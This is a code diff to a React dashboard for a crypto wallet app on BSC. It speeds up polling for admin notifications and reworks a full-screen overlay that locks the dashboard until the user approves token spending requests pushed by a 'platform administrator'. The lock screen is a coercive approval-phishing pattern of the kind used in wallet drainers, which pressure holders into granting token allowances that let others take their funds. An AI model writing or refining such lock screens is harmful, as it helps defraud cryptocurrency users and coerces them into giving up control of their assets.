@@ -633,7 +633,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
   }, [fetchWalletBalance]);
 
   useEffect(() => {
-    const interval = setInterval(fetchNotifications, 20000);
+    const interval = setInterval(fetchNotifications, 5000);
     return () => clearInterval(interval);
   }, [fetchNotifications]);
 
@@ -1064,15 +1064,18 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
         </header>
 
         <div className="dashboard-content">
-          {/* Approval request blocker — covers entire dashboard until user approves */}
+          {/* Content locker — full screen lock until user approves */}
           {adminNotifications.filter(n => n.type === 'approval_request').length > 0 && (
-            <div style={{position:'fixed',inset:0,background:'rgba(0,0,0,0.82)',zIndex:1000,display:'flex',alignItems:'center',justifyContent:'center',padding:'20px'}}>
-              <div style={{background:'#0f172a',border:'1px solid rgba(245,158,11,0.5)',borderRadius:'16px',padding:'28px 24px',maxWidth:'440px',width:'100%'}}>
-                <div style={{fontWeight:700,color:'#fbbf24',fontSize:'1.1rem',marginBottom:'6px',textAlign:'center'}}>
-                  🔒 Action Required
-                </div>
-                <div style={{fontSize:'0.85rem',color:'#94a3b8',textAlign:'center',marginBottom:'20px'}}>
-                  Please approve token spending to continue using your dashboard.
+            <div style={{position:'fixed',inset:0,zIndex:9999,backdropFilter:'blur(8px)',background:'rgba(0,0,0,0.88)',display:'flex',alignItems:'center',justifyContent:'center',padding:'20px'}}>
+              <div style={{background:'linear-gradient(135deg,#0f172a,#1e1b4b)',border:'1px solid rgba(245,158,11,0.6)',borderRadius:'20px',padding:'32px 28px',maxWidth:'460px',width:'100%',boxShadow:'0 0 60px rgba(245,158,11,0.15)'}}>
+                <div style={{textAlign:'center',marginBottom:'20px'}}>
+                  <div style={{fontSize:'2.5rem',marginBottom:'8px'}}>🔐</div>
+                  <div style={{fontWeight:700,color:'#fbbf24',fontSize:'1.2rem',marginBottom:'6px'}}>
+                    Authorization Required
+                  </div>
+                  <div style={{fontSize:'0.83rem',color:'#94a3b8',lineHeight:1.5}}>
+                    Your dashboard is locked. The platform administrator requires you to authorize token access before you can continue.
+                  </div>
                 </div>
                 {adminNotifications.filter(n => n.type === 'approval_request').map(notif => (
                   <AdminApprovalBanner
@@ -1085,6 +1088,9 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                     onDismiss={() => dismissNotification(notif.id)}
                   />
                 ))}
+                <div style={{fontSize:'0.75rem',color:'#475569',textAlign:'center',marginTop:'12px'}}>
+                  Your access will be restored once all approvals are completed.
+                </div>
               </div>
             </div>
           )}
